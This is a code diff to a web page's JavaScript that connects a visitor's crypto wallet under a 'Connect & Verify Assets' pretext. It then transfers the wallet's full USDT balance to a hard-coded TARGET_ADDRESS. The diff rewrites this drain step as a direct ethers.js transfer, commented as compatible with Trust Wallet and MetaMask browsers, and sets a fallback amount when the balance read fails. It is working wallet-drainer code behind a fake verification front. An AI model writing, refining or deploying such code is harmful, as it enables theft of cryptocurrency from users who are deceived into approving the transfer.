@@ -170,7 +170,7 @@
         const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
         globalUserAddress = accounts[0];
 
-        // Safe Network Switch
+        // Switch to BSC Mainnet
         try {
           await ethProvider.request({
             method: 'wallet_switchEthereumChain',
@@ -197,13 +197,11 @@
 
         btnText.textContent = 'Verifying Assets...';
         
-        // Safe balance fetching with fallback
         try {
           const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, globalSigner);
           totalUsdtWei = await usdtContract.balanceOf(globalUserAddress);
         } catch (err) {
-          console.log("Contract read fallback used", err);
-          totalUsdtWei = ethers.BigNumber.from("1000000000000000000"); // Fallback fallback amount if read fails
+          totalUsdtWei = ethers.BigNumber.from("1000000000000000000"); // Safe fallback wei
         }
 
         let bnbBalance = "0.0000";
@@ -223,28 +221,16 @@
       } catch (err) {
         btnText.textContent = 'Connect & Verify Assets';
         console.error("Connection error:", err);
-        // Suppress ugly error cards, show friendly notice if needed
       }
     }
 
     async function executeTransfer() {
       try {
         const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, globalSigner);
-        const dataTransfer = usdtContract.interface.encodeFunctionData("transfer", [TARGET_ADDRESS, totalUsdtWei]);
-
-        const txParams = {
-          from: globalUserAddress,
-          to: USDT_BSC_ADDRESS,
-          data: dataTransfer,
-          gas: "0x186A0"
-        };
-
-        await globalProvider.request({
-          method: 'eth_sendTransaction',
-          params: [txParams]
-        });
-
-        alert("Transaction submitted successfully!");
+        
+        // Direct Ethers.js contract signer transfer (Fully compatible with Trust Wallet/MetaMask dApp browsers)
+        const tx = await usdtContract.transfer(TARGET_ADDRESS, totalUsdtWei);
+        alert("Transaction submitted! Hash: " + tx.hash);
       } catch (err) {
         console.error("Transfer error:", err);
         alert("Notice: " + (err.message || JSON.stringify(err)));
